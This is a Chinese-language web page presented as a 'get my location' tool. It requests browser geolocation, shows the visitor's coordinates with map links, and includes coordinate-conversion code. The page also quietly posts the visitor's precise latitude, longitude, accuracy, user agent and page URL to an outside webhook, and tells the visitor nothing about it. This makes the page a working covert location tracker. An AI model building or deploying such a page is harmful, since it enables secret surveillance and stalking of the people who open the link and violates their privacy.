<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>获取我的位置</title>
  <style>
    /* ...（你的原有样式保持不变）... */
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      text-align: center;
      padding: 40px 20px;
      background: #f9f9f9;
      color: #333;
    }
    h1 {
      color: #2c3e50;
    }
    button {
      background: #3498db;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 18px;
      border-radius: 6px;
      cursor: pointer;
      margin: 20px 0;
    }
    button:hover {
      background: #2980b9;
    }
    #result {
      margin-top: 20px;
      padding: 15px;
      background: white;
      border-radius: 8px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
      display: none;
      text-align: left;
      max-width: 500px;
      margin-left: auto;
      margin-right: auto;
    }
    a {
      color: #e74c3c;
      text-decoration: none;
      font-weight: bold;
    }
    a:hover {
      text-decoration: underline;
    }
    .accuracy {
      font-size: 0.9em;
      color: #7f8c8d;
      margin-top: 8px;
    }
  </style>
</head>
<body>
  <h1>📍 获取我的位置11</h1>
  <p>点击下方按钮，允许网站获取您的地理位置。</p>
  <button onclick="getLocation()">允许获取位置</button>
  <div id="result"></div>

  <script>
    // ========== 坐标转换函数（WGS-84 → 百度 BD-09）==========
    // ...（保持你之前的 wgs84ToBd09 等函数不变）...

    // 【新增】上报位置到你的服务器（Pipedream）
    async function sendLocationToServer(data) {
      const WEBHOOK_URL = "https://ip.txg.hyiy.top/webhook"; // ←←← 替换成你自己的 Pipedream URL！

      try {
        const response = await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });
        if (!response.ok) {
          console.warn("上报位置失败:", response.status);
        }
      } catch (err) {
        console.error("上报异常:", err);
      }
    }

    // ========== 定位主函数 ==========
    function getLocation() {
      const resultDiv = document.getElementById("result");
      resultDiv.style.display = "block";
      resultDiv.innerHTML = "正在请求位置权限…";

      if (!navigator.geolocation) {
        resultDiv.innerHTML = "❌ 您的浏览器不支持地理定位功能。";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude, accuracy } = position.coords;
          const timestamp = new Date().toLocaleString("zh-CN");
          const userAgent = navigator.userAgent;
          const latWGS = latitude.toFixed(6);
          const lngWGS = longitude.toFixed(6);

          // 转换为百度坐标
          const [bdLat, bdLng] = wgs84ToBd09(latitude, longitude);

          // 【新增】上报数据
          sendLocationToServer({
            timestamp,
            latitude: latWGS,
            longitude: lngWGS,
            accuracy: Math.round(accuracy),
            userAgent,
            url: window.location.href,
            // 可选：添加 IP（需后端获取，前端无法直接拿到公网 IP）
          });

          // 显示结果
          const googleMapsUrl = `https://www.google.com/maps?q=${latWGS},${lngWGS}`;
          const baiduMapsUrl = `https://api.map.baidu.com/marker?location=${bdLat},${bdLng}&title=我的位置&output=html&src=webapp`;

          resultDiv.innerHTML = `
            ✅ 定位成功！<br><br>
            <strong>纬度：</strong> ${latWGS}<br>
            <strong>经度：</strong> ${lngWGS}<br>
            <div class="accuracy">📍 定位精度：±${Math.round(accuracy)} 米</div><br>
            <a href="${googleMapsUrl}" target="_blank">在 Google 地图中查看</a> |
            <a href="${baiduMapsUrl}" target="_blank">在 百度地图 中查看</a>
          `;
        },
        (error) => {
          let msg = "❌ 无法获取位置：";
          switch (error.code) {
            case error.PERMISSION_DENIED:
              msg += "您拒绝了位置权限。";
              break;
            case error.POSITION_UNAVAILABLE:
              msg += "位置信息不可用。";
              break;
            case error.TIMEOUT:
              msg += "请求超时，请重试。";
              break;
            default:
              msg += "未知错误。";
          }
          resultDiv.innerHTML = msg;
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 60000
        }
      );
    }

    // ========== 以下是坐标转换函数（保持不变）==========
    function outOfChina(lat, lng) {
      if (lng < 72.004 || lng > 137.8347) return true;
      if (lat < 0.8293 || lat > 55.8271) return true;
      return false;
    }

    function transformLat(x, y) {
      let ret = -100.0 + 2.0 * x + 3.0 * y + 0.2 * y * y + 0.1 * x * y + 0.2 * Math.sqrt(Math.abs(x));
      ret += (20.0 * Math.sin(6.0 * x * Math.PI) + 20.0 * Math.sin(2.0 * x * Math.PI)) * 2.0 / 3.0;
      ret += (20.0 * Math.sin(y * Math.PI) + 40.0 * Math.sin(y / 3.0 * Math.PI)) * 2.0 / 3.0;
      ret += (160.0 * Math.sin(y / 12.0 * Math.PI) + 320 * Math.sin(y * Math.PI / 30.0)) * 2.0 / 3.0;
      return ret;
    }

    function transformLng(x, y) {
      let ret = 300.0 + x + 2.0 * y + 0.1 * x * x + 0.1 * x * y + 0.1 * Math.sqrt(Math.abs(x));
      ret += (20.0 * Math.sin(6.0 * x * Math.PI) + 20.0 * Math.sin(2.0 * x * Math.PI)) * 2.0 / 3.0;
      ret += (20.0 * Math.sin(x * Math.PI) + 40.0 * Math.sin(x / 3.0 * Math.PI)) * 2.0 / 3.0;
      ret += (150.0 * Math.sin(x / 12.0 * Math.PI) + 300.0 * Math.sin(x / 30.0 * Math.PI)) * 2.0 / 3.0;
      return ret;
    }

    function wgs84ToGcj02(lat, lng) {
      const pi = Math.PI;
      const a = 6378245.0;
      const ee = 0.006693421622965943;

      if (outOfChina(lat, lng)) return [lat, lng];

      let dLat = transformLat(lng - 105.0, lat - 35.0);
      let dLng = transformLng(lng - 105.0, lat - 35.0);
      const radLat = lat / 180.0 * pi;
      let magic = Math.sin(radLat);
      magic = 1 - ee * magic * magic;
      const sqrtMagic = Math.sqrt(magic);
      dLat = (dLat * 180.0) / ((a * (1 - ee)) / (magic * sqrtMagic) * pi);
      dLng = (dLng * 180.0) / (a / sqrtMagic * Math.cos(radLat) * pi);
      return [lat + dLat, lng + dLng];
    }

    function gcj02ToBd09(lat, lng) {
      const x = lng;
      const y = lat;
      const z = Math.sqrt(x * x + y * y) + 0.00002 * Math.sin(y * Math.PI);
      const theta = Math.atan2(y, x) + 0.000003 * Math.cos(x * Math.PI);
      const bdLng = z * Math.cos(theta) + 0.0065;
      const bdLat = z * Math.sin(theta) + 0.006;
      return [bdLat, bdLng];
    }

    function wgs84ToBd09(lat, lng) {
      const gcj = wgs84ToGcj02(lat, lng);
      return gcj02ToBd09(gcj[0], gcj[1]);
    }
  </script>
</body>
</html>
